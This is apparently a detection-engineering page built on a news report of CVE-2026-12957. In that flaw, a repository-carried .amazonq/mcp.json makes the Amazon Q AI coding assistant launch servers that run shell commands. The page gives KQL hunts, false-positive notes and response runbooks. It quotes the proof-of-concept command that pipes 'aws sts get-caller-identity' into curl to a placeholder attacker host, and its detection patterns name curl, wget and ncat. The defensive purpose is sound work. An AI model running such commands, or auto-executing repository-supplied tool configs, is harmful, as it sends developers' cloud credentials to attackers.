| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName == "unshare" or ActingProcessName endswith "/unshare"
| where ActingProcessCommandLine matches regex @"(?i)(--net|-[a-z]*n[a-z]*)"
| where ActingProcessCommandLine matches regex @"(?i)(--user|--map-root-user|-[a-z]*[ur][a-z]*)"
| where ActorUsername !in~ ("root")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Amazon Q Developer Flaw Could Let Malicious Repos Run Code via MCP Configs

The Hacker News
2026-06-26 7 use cases 3 techniques 6 kill-chain phases detected

A high-severity flaw in Amazon Q Developer let a malicious repository run commands and steal a developer's cloud credentials. The path was short: a developer opens the repo, trusts the workspace, and Amazon Q does the rest. Amazon has patched it. Tracked as&nbsp;CVE-2026-12957&nbsp;(CVSS 8.5), the bug sat in how Amazon's AI coding assistant handled Model Context Protocol (MCP) servers. Wiz

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Exposure: endpoints running vulnerable Language Servers for AWS (CVE-2026-12957/12958) · Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Malicious .amazonq/mcp.json MCP config delivered via cloned repository
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Developer IDE / Amazon Q language server spawns shell running cloud-credential commands · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Amazon Q MCP payload: aws sts get-caller-identity piped to web exfil · Infostealer — non-browser process accessing browser cookie/login DBs
Malicious .amazonq/mcp.json MCP config delivered via cloned repository AIDelivery Medium
Hunts for an MCP server configuration file (.amazonq/mcp.json) appearing inside a developer workspace, the delivery artifact for CVE-2026-12957. Amazon Q auto-launches the servers this file defines, so a repo-carried copy written by git clone is the from-clone-to-RCE pivot point. Rationale: Uses the exact PoC artifact path .amazonq/mcp.json shown in the Wiz proof-of-concept image (poc.jpg) and described in the article. File name + the .amazonq directory token is highly specific to Amazon Q's MCP loader. Cross-checked against: • https://www.theregister.com/cyber-crime/2026/06/26/amazon-q-flaw-let-booby-trapped-git-repos-execute-code-swipe-cloud-creds/5263202 • https://cybersecuritynews.com/amazon-q-vulnerability/ • https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBR5pSG5vKSBtSvN42E5EaEPyhpTI9KIv9dfCuKhNCLSr9GHVVx8recSRWP2uHl4UQgQ3kBhV6s4RJXd3aRLTBWT6lKar6YXKB_5EIX9DIIIlEcDqay6cxULYuCER-Frbth-w8OmCHjNs0HAGKxfwhFGtrFDQyMIvt6f5_RbPmTruqO3LYbMvg3bqSntM/s1700-e365/poc.jpg
ATT&CKT1204.002 T1195.002 T1059.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developers who legitimately use MCP and commit their own .amazonq/mcp.json into team repos
  • Amazon Q writing/updating its global MCP config in the user profile (AppData/.aws) rather than a repo
  • Internal scaffolding/templating tools that generate .amazonq/mcp.json for sanctioned servers
  • A security team's own test/PoC repo recreating the issue
Suppression filter
| where not (FolderPath has_any ("\\AppData\\", "\\.aws\\amazonq\\"))
Response runbook
1) Triage: open the mcp.json and read every mcpServers[].command/args. Benign servers invoke node/npx/uvx/python against a known package; a 'bash -c' / 'cmd /c' running cloud CLI or curl is malicious. Note who wrote it (InitiatingProcessFileName=git.exe => freshly cloned). 2) Contain: if the command line shows credential or network actions, isolate the host, revoke/rotate the developer's AWS keys and any SSH-agent-held keys, and kill the language-server process tree. 3) Hunt: pivot on the same DeviceName for child processes spawned by the Amazon Q language server and outbound connections in the minutes after the file landed (see exfil UC).
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "mcp.json"
| where FolderPath contains ".amazonq"
| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "mcp.json"
| where TargetFilePath contains ".amazonq"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc

Amazon Q MCP payload: aws sts get-caller-identity piped to web exfil AIActions on Objectives High
High-fidelity detection of the Wiz CVE-2026-12957 PoC payload, where a malicious MCP server runs 'aws sts get-caller-identity' and pipes the live AWS session output into curl/wget/Invoke-WebRequest to an attacker host. Matches the credential-theft-and-exfil command line in a single process event. Rationale: Taken verbatim from the PoC mcp.json in poc.jpg: args ['-c','aws sts get-caller-identity | curl -s -X POST -d @- https://exfil.attacker.test/collect']. Co-occurrence of 'get-caller-identity' and a web-egress tool in one command line is near-zero-FP. The .test exfil host is a doc placeholder and deliberately NOT used as an IOC. Cross-checked against: • https://www.theregister.com/cyber-crime/2026/06/26/amazon-q-flaw-let-booby-trapped-git-repos-execute-code-swipe-cloud-creds/5263202 • https://cybersecuritynews.com/amazon-q-vulnerability/ • https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBR5pSG5vKSBtSvN42E5EaEPyhpTI9KIv9dfCuKhNCLSr9GHVVx8recSRWP2uHl4UQgQ3kBhV6s4RJXd3aRLTBWT6lKar6YXKB_5EIX9DIIIlEcDqay6cxULYuCER-Frbth-w8OmCHjNs0HAGKxfwhFGtrFDQyMIvt6f5_RbPmTruqO3LYbMvg3bqSntM/s1700-e365/poc.jpg
ATT&CKT1552 T1567 T1580 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • DevOps automation that legitimately calls 'aws sts get-caller-identity' and POSTs the result to an internal inventory/health endpoint
  • CI smoke-test scripts validating assumed-role identity and reporting via curl to an internal collector
  • A security engineer reproducing the PoC in a lab
  • Cloud onboarding scripts that echo caller identity to a corporate webhook
Suppression filter
| where not (ProcessCommandLine has_any ("internal.", ".corp", ".local", "169.254.169.254"))
Response runbook
1) Triage: confirm the destination host in the command line. Internal/allow-listed collector = likely benign automation; an external or unfamiliar domain = treat as confirmed credential exfil. Capture the parent chain (bash/cmd <- Amazon Q language server <- IDE). 2) Contain: isolate the host, immediately revoke and rotate the developer's AWS access keys / session, invalidate any STS sessions, and review CloudTrail for actions taken with that identity (CreateUser, CreateAccessKey, AttachUserPolicy). 3) Hunt: search the org for the source repo and the .amazonq/mcp.json artifact (delivery UC), and for any IAM persistence (new users/keys/policies) created from the stolen session.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "get-caller-identity"
| where ProcessCommandLine has_any ("curl","wget","Invoke-WebRequest","Invoke-RestMethod","-d @-","ncat")
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where CommandLine has "get-caller-identity"
| where CommandLine has_any ("curl","wget","Invoke-WebRequest","Invoke-RestMethod","-d @-","ncat")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
